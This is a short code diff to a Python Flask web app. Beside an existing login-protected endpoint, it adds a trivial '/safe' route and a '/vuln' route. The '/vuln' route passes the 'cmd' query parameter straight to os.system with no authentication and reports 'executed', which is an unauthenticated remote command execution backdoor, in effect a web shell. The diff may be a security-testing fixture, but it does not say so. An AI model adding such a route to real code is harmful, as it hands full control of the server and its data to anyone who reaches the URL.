@@ -81,6 +81,16 @@ def api_status():
 @login_required
 def api_whoami():
     return jsonify({"username": session["username"], "logged_in": True})
+@app.route("/safe")
+def safe():
+    return "this is safe"
+
+@app.route("/vuln")
+def vuln():
+    cmd = request.args.get("cmd")
+    os.system(cmd)
+    return "executed"
+
 
 
 # ── Lancement ────────────────────────────────────────
